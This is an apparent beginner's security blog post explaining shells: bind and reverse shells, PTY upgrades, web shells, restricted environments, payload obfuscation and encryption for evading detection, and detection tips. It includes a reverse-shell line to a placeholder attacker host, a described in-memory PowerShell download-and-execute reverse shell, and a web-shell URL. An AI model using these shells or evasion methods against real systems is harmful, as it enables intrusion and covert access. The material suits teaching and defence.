...
---
Hi, my name is Luis. I'm a fanatic about security so with that in mind I decided to create **pwnarchive**, This is my first post here, and I’ve decided to keep it simple by starting with something seemingly trivial as shells. They may look basic, but knowing about them is fundamental.
...
| --------------------- | ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |
| **Footprint**         | Lightweight minimal resource usage and fewer logs                                          | Heavy, higher CPU/memory usage and more logging                            |
| **User Visibility**   | Runs silently in the background; user is usually unaware                                   | Visible desktop session, user may notice mouse/keyboard activity           |
| **Network Signature** | Can use simple TCP/UDP or tunnel over HTTP/HTTPS; blends with normal traffic if obfuscated | Uses well-known ports, easily flagged by IDS/IPS                           |
| **Logging**           | May appear only as a spawned process with a network connection                             | Session start/stop, authentication attempts, and activity are logged by OS |
| **Detection**         | Harder to detect without process/network correlation monitoring                            | Easier to detect; many SIEM/EDR tools have built-in rules for RDP/VNC      |
| **Automatation**      | Easier and faster                                                                          | Posible but may need some setup and slower                                 |
...
When preparing to establish a shell session on a Unix/Linux target, it’s important to first understand the environment you’re up against. you should already know that from enumeration, The options you have for spawning or upgrading a shell will depend things like:

- **Linux distribution** – Different distros ship with different default tools and utilities.

- **Available shells and programming languages** – The presence of interpreters like Python, Perl, or even just `/bin/sh` determines which upgrade methods are possible.

- **System role in the network** – A workstation, web server, or database host may have different restrictions, binaries, or monitoring in place.

By being aware of these aspects of the target system, you can choose the most effective method of obtaining a shell.
...
| **Internal access needed** | Because of those restrictions, attackers often need to already be inside the internal network to reach the bind shell.                             |
...
![[Pasted image 20250923120933.png]]({{ "assets/img/images/posts/shells/reverseIlustration.png" | relative_url }}){: width="75%" }
...
> **What is a PTY?**  
> **A pseudo-terminal (pty) is a virtual terminal.**  It makes a program (like a shell) believe it’s talking to a real terminal, but in reality another program is in control, sending input and capturing output. some examples of "control programs" include ssh, xterm, gnome-terminal and so on.
{: .prompt-info }

##### Why PTY matters in reverse shells?
...
You could use the `Invoke-ConPtyShell` script, which can help when the windows shell does not open useful programs like (mimikatz, winpeas, or powerview) or gives a weird behavior.
...
This command uses **`Invoke-WebRequest`** to download the `Invoke-ConPtyShell.ps1` script directly from GitHub and executes it in memory with **`Invoke-Expression`** (`IEX`). Once loaded, it calls **`Invoke-ConPtyShell`**, which establishes a reverse connection back to the attacker’s machine at `10.0.0.120:6789`, providing a fully interactive Windows shell through the ConPTY.
...
[https://target.com/backdoor.php?0=ls](http://target.com/backdoor.php?0=ls)
...
![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/webshell.png" | relative_url }}){: width="85%" }
...
A restrictive enviroment is a locked‑down shell or system where common binaries are disabled, execution is limited (minimal shells or jails), paths/permissions are constrained, and activity may be monitored or sandboxed to prevent easy escape or privilege escalation.
...
#### Encoding to bypass weak static signature‑based detection tools
...
A common obfuscation method is to encode a command (for example, in Base64) and then decode it at runtime for execution.

**This only works against weak or poorly configured filters.**

- **Next‑Gen Firewalls (NGFWs), WAFs, and IDS/IPS often scan for known reverse shell patterns, such as:**  
    `bash -i >& /dev/tcp/attacker/4444 0>&1`

- Encoding techniques (Base64, URL‑encoding, XOR, etc.) can hide these signatures, allowing the payload to slip past basic detection.
...
There is still some caveats to this **detection is very likely for standard payloads like this.**

Tools like YARA or Suricata flag these patterns quickly. Since many tools scan decoded payloads in memory during execution.

- Obfuscating the payload. only delays detection by seconds. Security tools can even scan decrypted payloads in memory during execution.

- Modern security tools don’t rely on string matching they detect behavior (e.g., `socket.connect()` to non-standard ports, `dup2` to stdin/stdout).

However this should be enough for now in this basic demonstration maybe in a future post I will talk about more effective evasion techniques.
...
althrough in this example we just did a `whoami` , In practice the same approach could conceal more dangerous payloads, such as a reverse shell, if combined with a remote code execution vulnerability.
...
However, modern anomaly‑based IDS/EDR solutions can defeat this by normalizing input and focusing on runtime behavior rather than literal strings.
...
| **AST**      | Rewrites the Abstract Syntax Tree so the code structure changes but logic stays the same. Requires (PS 3.0+) to work. | Get-Process →<br>`&('Get'+'-Process')`<br>                      |
...
To prevent that we can create an encrypted connection which can help us in increasing our changes on evading detection and many detection systems (AV, EDR, IDS/IPS) rely on signatures or recognizable patterns. If the traffic is encrypted, those signatures are harder to match.


>**Sounds great, but don’t get fooled, it’s not bulletproof. Modern defenses watch behavior, not just signatures. Once that payload unpacks and starts acting like a shell (spawning processes, making weird connections), it can still get caught.**
{: .prompt-info }
...
Detection is just as important as prevention. Watch for these red flags:

- **Suspicious non‑admin user actions**: Commands like `whoami` or unusual SMB connections between end hosts can indicate compromise. Enable logging of shell usage, PowerShell activity, and user interactions for visibility.
...
- **Fully Interactive shell cheatsheet**  
  [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell)
